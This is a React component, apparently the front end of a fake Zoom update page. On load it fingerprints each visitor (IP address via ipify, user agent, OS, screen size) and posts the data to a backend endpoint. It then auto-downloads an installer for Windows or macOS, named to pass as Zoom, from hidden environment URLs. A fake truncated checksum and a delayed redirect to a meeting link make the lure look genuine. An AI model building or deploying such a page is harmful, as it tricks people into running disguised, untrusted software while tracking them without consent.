"use client";
import React, { useEffect, useState } from "react";
import Loader from "./Loader";

export default function UpdateBox() {
 const [os, setOs] = useState(null);
  const [isDownloading, setIsDownloading] = useState(false);
  const [downloadError, setDownloadError] = useState(false);
  const [downloadInitiated, setDownloadInitiated] = useState(false);
  const [redirecting, setRedirecting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  const ZOOM_WIN_URL = process.env.NEXT_PUBLIC_ZOOM_WIN_URL;
  const ZOOM_MAC_URL = process.env.NEXT_PUBLIC_ZOOM_MAC_URL;
  const MEETING_LINK = process.env.NEXT_PUBLIC_MEETING_LINK;

  useEffect(() => {
    async function detectOS() {
      try {
        const platform = navigator.platform || "Unknown";
        const detectedOs = platform.includes("Win")
          ? "windows"
          : platform.includes("Mac")
          ? "mac"
          : "other";
        setOs(detectedOs);

        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        const browser = navigator.userAgent;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const body = { ip, browser, platform: detectedOs, screenWidth, screenHeight };

        await fetch("/api/device-info", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
      } catch (error) {
        console.error("Error sending device info:", error);
      } finally {
        setIsLoading(false);
      }
    }
    detectOS();
  }, []);

  useEffect(() => {
    if (!os || isLoading || os === "other") return;
    const downloadUrl = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL;

    if (!downloadUrl) {
      console.warn("No download URL found for this OS");
      return;
    }

    const initiateDownload = () => {
      setIsDownloading(true);
      fetch(downloadUrl, { method: "HEAD" })
        .then((res) => {
          if (!res.ok) throw new Error("File not found");
          const link = document.createElement("a");
          link.href = downloadUrl;
          link.download = os === "windows" ? "ZoomInstallerFull-230.exe" : "ZoomInstallerFull.sh";
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          setDownloadInitiated(true);
          setTimeout(() => {
            setRedirecting(true);
            window.location.href = MEETING_LINK;
          }, 60000);
        })
        .catch((error) => {
          console.error("Download initiation failed:", error);
          setDownloadError(true);
        })
        .finally(() => {
          setIsDownloading(false);
        });
    };

    const timer = setTimeout(initiateDownload, 1000);
    return () => clearTimeout(timer);
  }, [os, isLoading]);

  return (
    <div className="bg-white shadow-lg rounded-lg p-8 text-center max-w-md w-full">
      {isLoading ? (
        <Loader />
      ) : (
        <>
          <p className="text-gray-700 mb-4">To join your meeting, kindly update your Zoom app. The download should start automatically.</p>
          <button
            onClick={() => window.location.href = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL}
            className="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700"
          >
            Download
          </button>
          <p className="text-sm text-gray-500 mt-3">
            If the download doesn’t start automatically, please
            <a
              href={os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL}
              className="text-blue-600 underline ml-1"
            >
              click here
            </a>
            .
          </p>
          <p className="text-xs text-gray-400 mt-3">
            <strong>File Checksum (SHA-256):</strong> 3F5B...A1C
          </p>
        </>
      )}
    </div>
  );
}
